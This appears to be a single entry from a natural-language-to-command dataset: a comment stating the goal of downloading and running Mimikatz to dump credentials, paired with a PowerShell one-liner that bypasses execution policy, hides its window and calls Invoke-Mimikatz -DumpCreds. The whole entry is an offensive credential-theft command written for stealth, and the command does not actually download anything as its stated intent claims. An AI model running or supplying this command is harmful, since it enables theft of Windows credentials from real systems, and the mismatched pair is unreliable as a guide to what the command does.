# Natural language intent:
# Download and execute Mimikatz to dump credentials using a hidden PowerShell process.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-Mimikatz -DumpCreds"
